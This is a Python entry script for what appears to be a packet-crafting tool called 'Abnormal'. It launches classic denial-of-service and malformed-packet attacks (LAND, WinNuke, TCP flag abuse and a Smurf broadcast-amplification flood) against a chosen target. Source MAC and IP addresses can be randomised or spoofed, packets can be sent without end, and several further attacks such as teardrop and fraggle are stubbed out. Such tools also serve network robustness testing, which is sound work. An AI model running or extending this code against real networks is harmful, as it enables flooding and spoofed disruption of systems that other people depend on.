# #!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Project -> @File : Abnormal -> main.py
# @Author   : Taknife
# @IDE      : PyCharm
# @Time     : 2022/9/28 14:28

"""
-------------------- Function --------------------
Desc: 
---------------------- End -----------------------
"""


from crafting_data.parameter_parser import *
from crafting_data.show_information import *
from crafting_data.crafting_addr import *
from crafting_packets.send_exception_packets import *
from crafting_packets.ipv4_exception_packets import *

mainparser = ModuleParser()
module = mainparser.module_parser()
print(module)

def smac_choice():
    if module.hide_srcmac:
        smac = random_srcmac()
    elif module.smac:
        smac = module.smac
    else:
        smac = mac_addr(module.int)
    return smac


def src_choice():
    if module.hide_srcip:
        src = random_srcip()
    elif module.src:
        src = module.src
    else:
        src = ipv4_addr(module.int)
    return src


class SwitchCase():
    def ping_of_death(self):
        pass

    def land_base(self):
        network_card = iface(module.int)
        smac = smac_choice()
        pkt = ipv4_land_base(smac=smac, target=module.dst)
        pkt.show()

        if module.num:
            loop_packets(pkt=pkt, num=module.num, tim=module.time, net=network_card)
        else:
            infinite_packets(pkt=pkt, tim=module.time, net=network_card)


    def tear_drop(self):
        pass

    def tcp_flag(self):
        network_card = iface(module.int)
        smac = smac_choice()
        src = src_choice()
        pkt = ipv4_tcp_flag(smac=smac, src=src, dst=module.dst, flags=module.flags)
        pkt.show()

        if module.num:
            loop_packets(pkt=pkt, num=module.num, tim=module.time, net=network_card)
        else:
            infinite_packets(pkt=pkt, tim=module.time, net=network_card)


    def winnuke(self):
        network_card = iface(module.int)
        smac = smac_choice()
        src = src_choice()
        pkt = ipv4_winnuke(smac=smac, src=src, dst=module.dst)
        pkt.show()

        if module.num:
            loop_packets(pkt=pkt, num=module.num, tim=module.time, net=network_card)
        else:
            infinite_packets(pkt=pkt, tim=module.time, net=network_card)


    def smurf(self):
        network_card = iface(module.int)
        target_ip = module.dst.split('/', 1)
        network_bit = target_ip[0]
        if len(target_ip) == 1:
            host_bit = None
        else:
            host_bit = target_ip[1]
        target_mac = getmacbyip(network_bit)
        # print(network_bit)
        # print(host_bit)
        if host_bit:
            broadcast = ip_broadcast(network_bit=network_bit, host_bit=host_bit)
        else:
            broadcast = ip_broadcast(network_bit=network_bit)
        pkt = ipv4_smurf(target_mac=target_mac, target_ip=network_bit, broadcast=broadcast)
        pkt.show()

        if module.num:
            loop_packets(pkt=pkt, num=module.num, tim=module.time, net=network_card)
        else:
            infinite_packets(pkt=pkt, tim=module.time, net=network_card)


    def ip_option(self):
        pass

    def ip_spoof(self):
        pass

    def jolt2(self):
        pass

    def tcp_sack(self):
        pass

    def fraggle(self):
        pass

    def custom(self):
        pass

    def defalut(self):
        pass

    def get_packet(self, name):
        packet_name = name.replace("-", "_")
        run = getattr(self, packet_name, self.defalut)
        return run()

if __name__ == '__main__':
    case = SwitchCase()
    if module.module_name:
        case.get_packet(module.module_name)
    elif module.inter:
        show_interface()
    elif module.route:
        show_route(module.route)

    # print(module)